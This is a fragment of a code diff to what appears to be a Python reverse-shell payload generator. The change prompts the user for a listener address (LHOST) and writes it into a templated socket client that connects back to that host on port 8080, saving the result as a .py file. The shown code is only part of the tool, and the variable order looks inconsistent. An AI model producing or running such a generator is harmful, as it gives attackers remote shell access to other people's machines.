@@ -72,7 +72,7 @@ import subprocess
 import os
 import sys
 
-LHOST = '127.0.0.1' # Change
+LHOST = """ + ip + """ # Change
 LPORT = 8080
 client = socket.socket()
 print("[-] Connection Initiating...")
@@ -109,6 +109,7 @@ while True:
     
 banner()
 file_name = input("[!] Insert a file name.py: ")
+ip = input("[!] Select Your LHOST")
 arq = open(file_name, 'w')
 finish()
 arq.write(temp + "\n")
